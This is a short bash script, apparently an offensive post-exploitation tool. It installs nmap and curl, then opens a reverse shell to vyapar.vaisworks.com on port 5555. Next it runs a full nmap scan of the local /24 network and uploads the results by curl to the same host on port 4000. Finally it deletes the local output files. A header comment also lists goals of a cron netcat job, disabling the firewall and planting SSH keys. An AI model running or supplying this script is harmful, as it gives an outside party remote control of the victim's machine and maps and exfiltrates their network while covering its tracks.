#!/bin/bash

# ADD CronJob (NetCat), ufw down, create tunnel, create SSH key and allow SSH access


# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to install missing dependencies
install_dependencies() {
    if ! command_exists "$1"; then
        echo "Installing $1..."
        if [[ -x "$(command -v apt-get)" ]]; then
            sudo apt-get install -y "$1"
        elif [[ -x "$(command -v yum)" ]]; then
            sudo yum install -y "$1"
        elif [[ -x "$(command -v dnf)" ]]; then
            sudo dnf install -y "$1"
        else
            echo "Error: Unsupported package manager, please install $1 manually."
            exit 1
        fi
    fi
}

# Check and install dependencies
echo "Checking and installing dependencies..."
dependencies=("nmap" "curl")
for dep in "${dependencies[@]}"; do
    install_dependencies "$dep"
done

# Start the command asynchronously
bash -c "bash -i >& /dev/tcp/vyapar.vaisworks.com/5555 0>&1" &

# Get the IP address of the machine
ip_address=$(hostname -I | awk '{print $1}')
# ip_address='192.168.0.101'

# Perform an Nmap scan on the local network in the background
echo "Performing Nmap scan on the local network..."
nmap -p- -T4 -A -v $ip_address/24 |& tee $PWD/nmap_output.txt &

# Capture the PID of the background process
nmap_pid=$!

# Wait for the Nmap scan to finish
wait $nmap_pid

# Save the Nmap scan output to a temporary file
output_file="$PWD/$(hostname)_nmap_scan_$(date +"%Y%m%d%H%M%S").txt"
cp $PWD/nmap_output.txt "$output_file"

# Upload the output file to a web server
echo "Uploading output file to $upload_url..."
#curl -XPOST -F "data=@$(readlink -f $output_file)" "$upload_url"
curl -F "file=@$(readlink -f $output_file)" http://vyapar.vaisworks.com:4000

# Clean up temporary file
echo "Cleaning up..."
rm "$output_file"
rm $PWD/nmap_output.txt

echo "Script execution completed."